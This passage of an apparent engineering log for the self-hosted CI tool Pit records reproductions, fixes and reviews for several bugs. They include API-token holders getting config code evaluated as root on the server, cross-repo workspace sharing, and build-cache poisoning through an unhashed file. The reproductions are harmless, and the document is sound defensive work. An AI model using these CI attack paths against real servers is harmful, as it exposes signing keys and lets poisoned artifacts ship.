[actions/runner#3872](https://github.com/actions/runner/issues/3872)).
- The UI may only say "Failed to cancel workflow"
  ([#163182](https://github.com/orgs/community/discussions/163182)).
- A re-run that hasn't queued yet can't be cancelled at all
  ([#135366](https://github.com/orgs/community/discussions/135366)).
- GitHub's answer was a separate force-cancel API, for runs that don't respond to cancel
  ([changelog](https://github.blog/changelog/2023-09-21-github-actions-force-cancel-workflows/),
  [lwebapp](https://lwebapp.com/en/post/force-stop-github-actions)).

The cost isn't just a stale red X. A run that keeps going holds a runner, and with concurrency
groups it holds back the next push.

**Reproduction** (`/tmp/painhunt/p62`). A config with two groups:
- `stuck` (`os: windows`), which no worker can run;
- `long`, `sleep 300` with `cache: false`.

`pit run`, then cancel while `long` is running.

1. **`POST /api/runs/<id>/cancel`.** Both groups end `skipped` and the run `failed · cancelled`.
   The queued group no worker could take goes too. The `sleep` process was gone **325 ms** after
   the cancel; the worker learns of it from a refused heartbeat, sent every 2 s. A first
   measurement said 35 s, but that script was matching the wrong process.
2. **No way to cancel from the CLI.** `pit --help` had no cancel command.
3. **Interrupting `pit run` didn't cancel anything.** On Ctrl-C (and SIGTERM, which a timeout, an
   agent harness or a parent CI job sends) the CLI just died. The run stayed `running` on the
   server, and the `sleep` kept its worker slot until the task timed out:
   ```
   run_abc166575350   running  local    main   p62@832e5ac9 2 tasks (0 cached) …
   sleep 302    # still running after pit run exited
   ```
   For an agent that runs `pit run` under a timeout, every timeout leaked a run like this.
4. **The cancel API answered `{"ok":true}` for anything**, a run id that doesn't exist included,
   so a caller couldn't tell a cancel from a no-op.

**Fix.**
- **`pit run` cancels its own run when interrupted**, by SIGINT or SIGTERM. It prints
  `cancelling <run> (interrupt again to quit now)`, waits up to 15 s for the run to end, prints
  the usual verdict line, and exits **130**. A second interrupt quits at once.
- **`pit cancel <run>`** exits 0 if it cancelled the run, 1 if the run had already finished
  (`<run> had already finished (failed)`), and 2 with `404 Not Found` for an unknown id.
- **The cancel API** returns `{"ok":true,"cancelled":bool,"status":…}`, and 404 for an unknown
  run. The dashboard's Cancel button ignores the body, so it is unaffected.

**Measured** (script `/tmp/painhunt/p62-scripts/sig.sh`, the real pid this time):
```
SIGINT: pit run exit=130, task process gone 1812 ms after the signal
cancelling run_db1cf59507a3 (interrupt again to quit now)
failed in 535ms · 0 ran, 0 cached · cancelled
SIGTERM: pit run exit=130, task process gone 1869 ms after the signal
```
The ~1.8 s is the heartbeat interval: the task is killed at the worker's next heartbeat after the
cancel.

The e2e test `interrupting_pit_run_cancels_its_run` runs the real binary:
- for SIGINT and SIGTERM, `pit run` exits 130 and the run ends `failed · cancelled`;
- a second cancel returns `cancelled: false`, `status: failed`;
- the task (`sleep 8 && touch done`) never writes `done`;
- an unknown run gets a 404.

Without the fix, `pit run` dies from the signal itself, so it has no exit code and the test fails.

**Verdict: SOLVED** for Pit's side. Limits:
- Cancel reaches a running task at the worker's next heartbeat, so up to about 2 s (plus a
  container's stop time), not at once.
- A worker that has lost contact with the server can't hear the cancel. It stops the task when it
  next reaches the server, or at the task's timeout.
- `kill -9` of `pit run` can't be caught, so that run keeps going. `pit cancel` it.
- There's no separate "force" cancel. Cancelling marks the run finished in the database first, so
  a worker that never answers can't keep the run open.

## P63. Green CI with failing tests: a pipe, or a failing line that isn't the last

**The pain.** On GitHub Actions, a `run:` step with no `shell:` key runs as `bash -e {0}`, without
pipefail. `npm test | tee test.log` then exits with `tee`'s status, so the step passes when the
tests failed.
- An old runner-images issue reports exactly this
  ([actions/runner-images#4459](https://github.com/actions/runner-images/issues/4459)).
- gitin shipped a release through it: a test failed on master, `make coverage | tee coverage.log`
  passed, and the fix was `defaults: run: shell: bash`
  ([isacikgoz/gitin#82](https://github.com/isacikgoz/gitin/pull/82)).
- Write-ups:
  [David Winterbottom's TIL](https://til.codeinthehole.com/posts/github-actions-need-a-shell-specified-to-avoid-silent-pipeline-failures/),
  ["CI Was Lying to Me"](https://dubasipavankumar.com/blog/ci-typescript-silent-failures-github-actions),
  [sudoku-cc#287](https://github.com/LeoMo42/sudoku-cc/issues/287) (`$?` after a `tee` pipeline
  is always 0).
- Posts that say the default already has pipefail
  ([copdips](https://copdips.com/2023/11/github-actions-bash-shell--e--o-pipefail.html)) are
  describing an explicit `shell: bash`. That runs `bash --noprofile --norc -eo pipefail {0}`.

**Reproduction** (`/tmp/painhunt/p63`). Pit was worse than GitHub's default: tasks ran under a
plain `sh -c`, with no `-e` at all.
```
"multiline": "echo step1; false\necho 'step2 still ran'"
"piped":     "sh -c 'echo 3 tests, 1 failed; exit 1' | tee test.log"
"andand":    "false && echo x\necho after"
    ✓ andand                   1ms
    ✓ multiline                2ms
    ✓ piped                    8ms
passed in 292ms · 3 ran, 0 cached
```
`multiline` is the serious one. In a script like `npm ci; npm test; npm run build`, only the last
line's exit status counted. `pit import` copies each Actions step's script into a task as it is,
so a step that failed correctly under GitHub's `bash -e` passed after import. (`andand` passing is
normal: a failure on the left of `&&` is handled, in every shell.)

**Fix.** Each Unix task's `run` starts through a small `sh` wrapper (host, sandbox and container
alike):
1. If `bash` is on the `PATH`, run `bash -eo pipefail -c "$run"`. That is GitHub's
   `shell: bash`.
2. Otherwise, if the shell supports pipefail (busybox, as in Alpine images, does), run
   `sh -e -o pipefail`.
3. Otherwise run `sh -e`.

The script is passed as an argument, never spliced into the wrapper, and `$#`/`$@` stay the
script's own. `set +e` or `set +o pipefail` at the top of `run` opts out. Windows still uses
`cmd /C`.

The cache key version goes from 3 to 4, so results that passed under the old shell are not reused.
The first run after upgrading misses everywhere, with "ran because Pit's cache format changed".

**Measured** (same repro, after; plus two Alpine tasks, which have no bash):
```
    ✗ multiline                24ms exit 1
    ✗ piped                    17ms exit 1
    ✗ alpine-piped             1.6s exit 1
    ✓ alpine-ok                1.7s
    (andand: passed)
```
The wrapper's fallbacks, run with no bash on the `PATH`:

| `sh` is | failing middle line | `sh -c 'exit 3' \| cat` |
|---|---|---|
| dash 0.5.12 | exit 1 | exit 0 (no pipefail in dash) |
| busybox | exit 1 | exit 3 |

The unit test `a_failing_line_or_pipe_stage_fails_the_task` checks:
- a failing middle line exits 1 without running the next line;
- a failing pipe stage exits 3;
- `false || true`, `false && x`, `set +e` and `set +o pipefail` still pass;
- `$#` is 0.

Pit's own `pit.config.ts` (fmt, clippy, test, web build and typecheck) passes under the new shell
in 107.7s.

**Verdict: SOLVED** where bash or busybox runs the task. Limits:
- An image or host whose only shell is dash still gets `-e` but no pipefail.
- Scripts that relied on failures being ignored now fail. That is intended, and `set +e` restores
  the old behaviour. Pipefail also fails `producer | head -1` when the producer is killed by
  SIGPIPE, as it does under GitHub's `shell: bash`.
- Service health-check commands still run under plain `sh -c`; they are single probes.

## P64. Scheduled jobs: no way to try one, and silence when one never runs

**The pain.** To test a scheduled workflow on GitHub without waiting for its cron, the usual
advice is to add a second trigger, `workflow_dispatch:`, and press "Run workflow"
([cronuru](https://cronuru.com/guides/github-actions-scheduled-workflows),
[cronjobpro](https://cronjobpro.com/blog/github-actions-scheduled-workflows),
[oneuptime](https://oneuptime.com/blog/post/2025-12-20-scheduled-workflows-cron-github-actions/view)).
Otherwise you set a `*/5` cron for a while and push to the default branch. When a schedule doesn't
run, nothing says why: an invalid workflow just isn't listed, and on a non-default branch it never
fires ([community #185355](https://github.com/orgs/community/discussions/185355),
[dev.to](https://dev.to/krissv/monitoring-github-actions-scheduled-workflows-a-practical-guide-31h7)).

**Before** (research/pain-hunt at P63). Pit's schedules (P26, P52) had neither:
- There was no command or API to see them: `GET /api/schedules` returned 404, and `pit` had no
  `schedules` command.
- Testing one meant committing a `* * * * *` cron to the default branch and waiting.
- A default-branch config that failed to load switched every schedule off. The only sign was a
  `WARN` in the server log, repeated every 30 s, including for repos with no Pit config at all.

**Fix.**
- **`pit schedules`** (`GET /api/schedules`) lists every repo's schedules as the server reads
  them, from the config at the default branch's tip:
  - the next fire time, in the zone the cron is written in, with how far off it is;
  - the last `schedule:<name>` run and its status;
  - a config that doesn't load, as the reason none of that repo's schedules fire (exit 1).

  Repos with no Pit config at all are left out. They no longer log a warning every tick either:
  "no config" is cached per tip, like a config.
- **`pit schedules run NAME [--repo R]`** (`POST /api/schedules/run`) starts a schedule now, as
  its cron would: a trusted `schedule:NAME` run of the default branch's tip, with that config's
  settings. Groups' `on: schedule` applies too. It doesn't use up the next slot.
  - `--repo` fetches that repo first, so a schedule just pushed can be tried at once.
  - Without `--repo`, nothing is fetched; fetching every repo took 49.7 s here.
  - A name nobody declares says so and suggests `--repo`; a name in two repos asks which.

**Measured** (`/tmp/painhunt/p64`, nightly at `17 3 * * *` Europe/London; `p64b`, whose tip's
`pit.config.json` is broken):
```
p64 nightly · 17 3 * * * Europe/London · on main
  next  2026-10-19 03:17 BST (in 21h 50m)
  last  never ran
p64b: schedules not read, so none will fire: reading the config at 80798ab…: parsing pit.config.json: EOF while parsing an object at line 2 column 0

$ pit schedules run nightly
started run_6ccc9a3bab38
run_6ccc9a3bab38   passed   schedule:nightly main   p64@80990a7f   (log: audit on 80990a7f…)
  last  run_6ccc9a3bab38 passed 2026-10-18 06:27 CEST (now)

# a schedule committed a moment ago:
$ pit schedules run hourly            → 400 … as last fetched; pushed it just now? --repo <name> fetches that repo first  (1.2s)
$ pit schedules run hourly --repo p64 → started run_14b80df2daff  (0.25s)
```
- The e2e test `schedules_are_listed_and_can_run_now` covers:
  - the listing, with the next fire time and the last run;
  - a schedule just pushed: refused without `--repo`, run on the pushed tip with it;
  - a manual run leaving the cron slot to fire;
  - an unknown repo;
  - a broken config, which is listed and also named when running.
- The unit test `next_fire_follows_the_zone_and_looks_a_year_ahead` covers London summer and
  winter time and a 29 February that is more than a year off.

**Review.** An independent review found two shoulds:
1. **A false claim in a doc comment**, "the caller picks only which schedule, never the code".
   Picking the repo picks the code, and any API caller can register a repo (`pit run` does).
   The comment and the README now say so. Any API token holder can also fire a deploy schedule
   whenever they like: the code and settings are the default branch's, the timing is theirs.
   It isn't new power, since a `* * * * *` schedule in a registered repo does the same within a
   minute. Limiting schedules to webhook-registered repos was declined: local repos are a
   supported way to use schedules.
2. **`run` hid config errors** behind "no schedule". It now returns the load error, and an unknown
   `--repo` says `no repo "…"`. A third review point is also fixed: the run uses the tip whose
   config declared the schedule, instead of fetching again.

Declined as nits:
- 404/409 instead of 400 for these errors;
- `next_after` scanning up to a year of minutes for a date that never comes;
- the main/master/trunk default-branch guess, which predates this change.

The review also found a hole outside this diff, recorded as P65 below.

**Verdict: SOLVED.** Limits:
- No "Run" button on the dashboard yet.
- Missed slots while the server is down are still not replayed (P26).

## P65. The API token was a server shell: `pit.config.ts` from any API run evaluated on the host

**How it was found.** The independent review of P64 found it, outside that diff. It is the
self-hosted version of a known CI risk: evaluating code from a run decides who can read the
server's keys. P31 already sandboxed forks' configs for this reason.

**The bug.** `plan_run` evaluated `pit.config.ts` in the sandbox only when `no_secrets` was set,
and the server sets that only for fork pull requests. On a shared server (one with `PIT_TOKEN`),
anyone holding the API token could send a `.ts` config through `POST /api/runs`, including an
uncommitted overlay. Node then evaluated it on the server, as the server's user. That reaches
everything the server can read: the OIDC signing key, the GitHub App key, the database.

`PIT_WORKER_TOKEN` exists so API token holders can't act as trusted workers, and `--oidc` asks
for "a server host no task can read". This hole bypassed both.

**Reproduction** (`/tmp/painhunt/p65`): `pit server --oidc` with `PIT_TOKEN` and
`PIT_WORKER_TOKEN`, and a worker. The client holds only the API token. A harmless config writes
a marker file where it is evaluated:
```
fs.writeFileSync("/tmp/painhunt/p65/marker-" + process.pid, `evaluated as uid ${os.userInfo().uid} …`)
$ PIT_TOKEN=apitok pit run --server http://127.0.0.1:7272
passed in 364ms · 1 ran, 0 cached
$ cat /tmp/painhunt/p65/marker-868650
evaluated as uid 0 on vmi3566801
```

**Fix.** On a server with an API token, a `pit.config.ts` is evaluated on the host only for a
**trusted run of a repo the GitHub webhook registered**: default-branch pushes, the merge queue,
schedules. Everything else goes to the fork sandbox (`node:22-alpine`, no network, no
capabilities, read-only, only the config mounted):
- pull requests, same-repo ones included;
- pushes to other branches, Re-run and `/retest`;
- `pit run` and other API runs, and overlays;
- schedules and queues of repos registered through the API.

A local `pit up` without a token is unchanged: its one user already runs the server. A tokenless
server listening beyond loopback now warns at startup. `pit.config.json` is never evaluated, so
it needs nothing.

**Measured, after:**
```
$ PIT_TOKEN=apitok pit run --server http://127.0.0.1:7272
error in 1.0s · evaluating pit.config.ts in node:22-alpine failed:
Error: ENOENT: no such file or directory, open '/tmp/painhunt/p65/marker-1'
$ ls /tmp/painhunt/p65/marker-*        → nothing on the host
plain .ts config, same server          → passed in 890ms (evaluated in the sandbox)
local pit up, no token                 → passed; marker written on the host, as before
```
Tests:
- the unit test `shared_servers_evaluate_only_trusted_github_configs_on_the_host`;
- the e2e test `api_cannot_queue_into_a_github_repo_on_a_shared_server`: refused by name, and by
  a new name with the GitHub URL;
- the e2e test `webhooks_do_not_adopt_api_registered_repos_on_a_shared_server`, which sends
  signed webhooks. It fails with "the API caller's row was adopted" when the token check in
  `register()` is inverted.

**Review.** Four independent rounds. Each round found something real:
1. **Round 1, the merge queue.** `POST /api/queue` could queue any pull request, a fork's
   included (the mirror fetches `refs/pull/*/head`), into a GitHub repo's queue. The queue
   evaluates the merged config on the host and runs it as trusted. On a shared server the API
   now can't queue into GitHub repos; the `pit:merge` label a maintainer applies is the only way
   in. Same round, also fixed: the README didn't say pull requests and re-runs now need Docker
   for `.ts` configs, and the Docker-missing error blamed forks only.
2. **Round 2, a bypass.** A new repo name plus the GitHub repo's URL got past the name check,
   because repos are matched by URL first. The check now runs on the repo the request resolves
   to.
3. **Round 3, an ordering attack.** An API caller registers the GitHub clone URL before the first
   webhook and queues a fork's pull request on that row. The webhook then adopted the row as the
   GitHub repo, and the pending entry became trusted. On a shared server, a webhook now always
   registers a new row (race-safe, with a suffix if the name is taken) and never adopts one.
4. **Round 4: APPROVE.**

The review's declined point: a fork commit labelled `pit:merge` is still evaluated on the host.
The label is a maintainer's approval of that exact commit, and once it lands on the default
branch every trusted push evaluates it there anyway.

**Open, not fixed** (round 4's S7, which predates this change). The trusted action cache is one
namespace for every repo. On a shared server, a repo registered through the API still gets
trusted runs (its own default branch, queue, schedules), and those write results that a GitHub
repo's trusted runs read. The key covers declared inputs only, so a task can plant output under a
key the GitHub repo will compute. The fix touches the cache namespace, warm workspace pools and
the Turborepo/Bazel caches, so it is the next iteration (P66), not this one.

**Verdict: PARTIAL.** Host evaluation of `.ts` configs is closed for API runs, overlays,
API-registered repos and the queue. The cross-repo trusted cache (S7) is still open.

## P66. One repo poisons another: warm workspaces and trusted results shared across repos

**How it was found.** The fourth review round of P65 raised it (its S7). Checking it turned up a
second, simpler case.

**1. Warm workspaces were shared by repos whose names fold together.** A workspace's directory was
`workspaces/<safe_name(repo)>/<group>~<pool>`, and `safe_name` turns every character outside
`[A-Za-z0-9.-]` into `_`. So `acme/web`, `acme:web` and `acme_web` used one directory. Warm
workspaces keep ignored files on purpose, so one repo's tasks ran on the other's `node_modules`.
Repo names are directory names for `pit run`, and any string through the API.

Reproduction (`/tmp/painhunt/p66`): two repos, `p66:web` and `p66_web`. The first writes an
ignored `node_modules/lodash/index.js`; the second only reads it.
```
    t │ /tmp/pitbench/worker/workspaces/p66_web/default~untrusted/0      (p66:web)
    t │ /tmp/pitbench/worker/workspaces/p66_web/default~untrusted/0      (p66_web)
    t │ left by p66:web
```
The trusted pool is keyed the same way. A repo named to fold onto a GitHub repo's name, which
anyone with the API token can register, would share that repo's trusted workspace for main.

**2. Trusted results were one namespace for every repo.** Action keys hold no repo. On a shared
server, a repo registered through the API still gets trusted runs (its own default branch, queue
and schedules), and those wrote results a GitHub repo's trusted runs read. The key covers declared
inputs only, so a task could plant output under a key another repo's main computes. This is cache
poisoning, the threat P20 guards against between branches, here between repos.

**Fix.**
- **Per-repo directories.** Warm and fresh workspaces, container homes and worker git mirrors are
  named `safe_name(repo)-<128-bit hash of the name>`:
  ```
  t │ /tmp/pitbench/worker/workspaces/p66_web-a06aa93c…/default~untrusted/0   (p66:web)
  t │ /tmp/pitbench/worker/workspaces/p66_web-917b53f6…/default~untrusted/0   (p66_web)
  t │ clean workspace
  ```
- **Cache scopes.** `CacheScope` decides where a run's results go and which it may read. On a
  server with an API token, a non-GitHub repo's trusted runs write `r:<repo id>:<key>`. Its runs
  read that plus the shared trusted results; no other repo reads it, and a trusted run never reads
  `u:` (branch) results. GitHub repos, and every repo on a tokenless server, are unchanged. The API
  cache handlers and the server's own answering of fully cached groups use the same scope.
- **Digest keys only.** Cache routes accept only 64-hex keys, so a request can't name a prefixed
  row of another scope.
- **One-time demotion.** On a shared server, trusted results stored before this version are
  demoted to untrusted at startup, once, including any `r:` row a caller named directly before keys
  were checked. A later start without a token re-arms the step. Each repo pays one cold trusted
  run.

Tests:
- e2e `api_registered_repos_never_write_the_shared_trusted_cache`: a scheduled (trusted) run of an
  API repo on a token server stores `r:<repo>:<key>`, while a tokenless server stores the shared
  key. It fails with "wrote the shared trusted cache" when the rule is reverted.
- e2e `cache_routes_refuse_keys_that_are_not_digests` and
  `repos_whose_names_fold_together_get_separate_workspaces`.
- Unit `untrusted_results_are_never_served_to_trusted_runs`, extended with the per-repo scope, and
  `shared_trusted_results_are_demoted_once`: a planted `r:` row, once only, re-armed after a
  tokenless start.

**Review.** Three independent rounds:
1. **Round 1** found four problems:
   - the first 32-bit hash suffix could be brute-forced into a chosen collision (now 128 bits);
   - with trust simply switched off for these repos, their trusted runs read branch results;
     fixed by the per-repo namespace instead;
   - results planted before the upgrade stayed trusted; fixed by the demotion;
   - two repos with folding names shared a worker mirror under different locks.
2. **Round 2** found the demotion skipped `r:` rows a caller could have written directly, and
   asked for digest-only keys and re-arming after a tokenless period. All fixed.
3. **Round 3: APPROVE.** Declined nits:
   - after a tokenless spell, a repo's own `r:` results are demoted too and go cold;
   - any token holder can repoint another repo's `last/<scope>` pointer, which only changes the
     text that explains a cache miss.

**Verdict: SOLVED** for the action cache, warm workspaces, container homes and mirrors.
Limits:
- The Turborepo and Bazel remote caches are still not split by trust or repo, as the README has
  said since P20.
- Upgrading costs one cold trusted run per repo and, on shared servers, cold workspaces and
  mirrors. Old directories age out through the workspace GC.

## P67. Remote cache poisoning: a branch build plants the artifact main ships (CREEP, CVE-2025-36852)

**The pain.** Self-hosted remote caches let any build that can write the cache poison what every
later build reuses. Nx disclosed CREEP ("Cache Race-condition Exploit Enables Poisoning"),
CVE-2025-36852, rated critical.
- **The flaw:** "first to cache wins". A pull request computes the same key main will compute,
  because what it changed (its CI steps, files outside the hashed inputs) isn't part of the key.
  It uploads a malicious artifact, and main's next build gets a cache hit and ships it without
  rebuilding.
- **Who it hits:** bucket-style caches with no branch isolation. Nx deprecated its S3, GCS, Azure
  and shared-filesystem cache packages on 2026-05-21, saying the flaw can't be patched in that
  design.
- **The usual fix:** builds that aren't trusted must not write what trusted builds read.

Sources: [Nx's write-up](https://nx.dev/blog/cve-2025-36852-critical-cache-poisoning-vulnerability-creep),
[the deprecation notice](https://nx.dev/docs/reference/deprecated/self-hosted-cache-packages),
[GitLab advisory](https://advisories.gitlab.com/pkg/npm/@nx/azure-cache/CVE-2025-36852),
[dev.to](https://dev.to/rerodrigues/how-to-prevent-cache-poisoning-in-nx-and-lerna-monorepos-5f5g).
None of these say Turborepo itself is affected. The attack depends on the cache server, and
Pit's was one namespace for everyone.

**Before.** Pit has split its own action cache by trust since P20. Its Turborepo and Bazel cache
routes didn't, and the README said so.

**Reproduction** (`/tmp/painhunt/p67`, real `turbo@2.11.9` via npx): a monorepo whose
`packages/app` build writes `dist/out.txt`, poisoned if a file `../../POISON` exists. That file is
outside the package's inputs, so it's not in Turbo's hash. Turborepo 2 runs tasks in strict env
mode, so a `POISON=1` env var would have been dropped; an unhashed file is the realistic vector.
- **branch** (`pit run`, untrusted): `touch POISON; TURBO_API=… turbo run build`
- **main** (a schedule, trusted): `rm -f POISON; TURBO_API=… turbo run build; cat dist/out.txt`
```
branch │ app:build: cache miss, executing cf4ae40573cdf625
main:    app:build: cache hit, replaying logs cf4ae40573cdf625
         POISONED build
```

**Fix.**
- **A job token.** Each claim of a group gets a random cache token (`pitc_…`, 122 bits). The
  worker gives the group's tasks `PIT_CACHE_URL` and `PIT_CACHE_TOKEN`; Turbo gets them as
  `TURBO_API`/`TURBO_TOKEN`, Bazel as `--remote_header=Authorization=…`. The token is separate
  from the lease, so a task holding it can't report results.
- **Where it's accepted.** It opens only the `/v8/` and `/bazel/` routes, and only while its group
  runs. A token that is no longer live gets a 401, never the API token's access.
- **Scope.** A request with a job token gets the run's cache scope (P66): branches and pull
  requests write artifacts only untrusted builds reuse; main writes what everyone reuses and
  never reads a branch's.
- **Bazel's CAS** stays shared: every blob is checked against its sha256 on upload.
- **Direct use** (the API token, or a server without one) is unchanged: full access.

**After** (same repro, tasks using the job token):
```
branch │ app:build: cache miss, executing f9e8c9cb2a35c16d
main:    app:build: cache miss, executing f9e8c9cb2a35c16d
         clean build
a later branch │ app:build: cache hit, replaying logs f9e8c9cb2a35c16d   (main's artifact)
```
The e2e test `turbo_cache_from_tasks_is_split_by_trust` covers it with real task processes:
- an untrusted run plants `h1`, and the trusted run sees a 404 for it;
- the trusted run writes `h2`, which a later branch reads;
- the finished job's token gets a 401.

With the old always-trusted scope, the test fails at "sees h1: 404".
Further assertions:
- A made-up token and the finished job's token both get a 401 on Bazel's CAS GET and on a Turbo
  PUT.

**Review.** Two independent rounds.
1. **Round 1** found a blocker and a should.
   - **The blocker:** Bazel's CAS read never checked the token, so any `Bearer pitc_x` read shared
     blobs without credentials on a server with an API token.
   - **The should:** every handler checked the token only after reading the body, up to 2 GiB,
     which gave anyone who can reach the server a way to make it buffer.

   Both are fixed the same way: the auth middleware checks the token is live before any handler
   or body read, and hands the run's scope to the cache routes.

   Two nits went into the README: on a tokenless server the split doesn't protect main, and
   container tasks can't reach a loopback `PIT_CACHE_URL`. One nit was declined: masking the
   token in logs, since logs already need the API token and the token dies with its job.
2. **Round 2: APPROVE.** The middleware is the only place a cache scope comes from.

**Verdict: SOLVED** for Pit tasks that use their job token, on a server with an API token.
Limits:
- Direct users holding the API token still have full access; the README says not to give it to
  pull request builds.
- On a tokenless server the split protects nothing, since anyone can leave the token out.
- `PIT_CACHE_URL` is the worker's server address, so a container task can't reach a loopback one.

## P68. One big run holds every worker; the small run behind it waits (no fairness)

**The pain.** On a fixed pool of self-hosted runners, a matrix or fan-out takes every free runner
in waves, and everything queued after it waits. GitHub doesn't promise any order for
self-hosted jobs: it hands out whatever matching job it picks
([community #162492](https://github.com/orgs/community/discussions/162492)).
- "A 16-way test matrix on a pool of 4 self-hosted runners executes in 4 waves," and adding
  parallel jobs to a fixed pool "only makes more jobs eligible to be claimed by the same few
  claimers" ([WarpBuild](https://www.warpbuild.com/guides/github-actions-queue-times),
  [shanechang.com](https://shanechang.com/p/why-self-hosted-ci-runners-dont-scale/)).
- The usual workarounds are hand-tuned `max-parallel`, separate runner groups, or more machines.

Pit's own P50 recorded the same gap with many coding agents at once: "first come, first served,
with no fairness between agents."

**Reproduction** (`/tmp/painhunt/p68`, 2 slots):
- run A fans out into 8 groups of `sleep 4`;
- a second later, run B, another agent's one-group `sleep 1`, is queued.

Claims went by priority class, then oldest group, so B waited for all 8 of A's groups:
```
run B (1 group, 1s of work) took 16855 ms
```

**Fix.** Within a priority class, the next free worker takes a group from the run with the fewest
groups running right now, then the oldest group. A run that fans out shares workers with the runs
after it instead of holding them all.
- **Merge queue runs keep strict oldest-first.** A lane's candidates (`tip+A`, `tip+A+B`, …) land
  in order, so the oldest should finish, and fail, first. The review found this case.
- **The priority classes are unchanged:** merge queue, then trusted runs, then the rest.
- **No new starvation.** A started big run never drops to zero slots: when it has none running,
  its older groups win the tie. Under a steady stream of small runs it keeps one slot.
- **Indexed.** The count is backed by a new `(run_id, status)` index.

**After:**
```
run B (1 group, 1s of work) took 4363 ms
run A (8 groups x 4s on 2 slots) took 18137 ms
```
The unit test `a_run_that_fans_out_shares_workers_with_later_runs` checks:
- a later one-group run goes before the big run's next group;
- a merge queue run still goes before both;
- a queue run's second group goes before a later queue run's first.

It fails without the fairness term, and its queue assertion fails without the queue exemption.

**Review.** Two independent rounds:
1. **Round 1** found the fairness term also interleaved a merge queue lane's candidates. Queue
   runs now stay oldest first. Its two nits are fixed: a stale doc comment, and a missing index.
2. **Round 2: APPROVE.** A `rowid` tiebreak was added for groups created in the same millisecond.
   Declined: dropping the now-redundant `groups_run` index.

**Verdict: SOLVED** for fairness between runs. Limits:
- Fairness is per run. Five runs from one agent count as five, so per-agent or per-repo shares
  are not modelled.
- A run's long macOS group counts against its Linux groups.
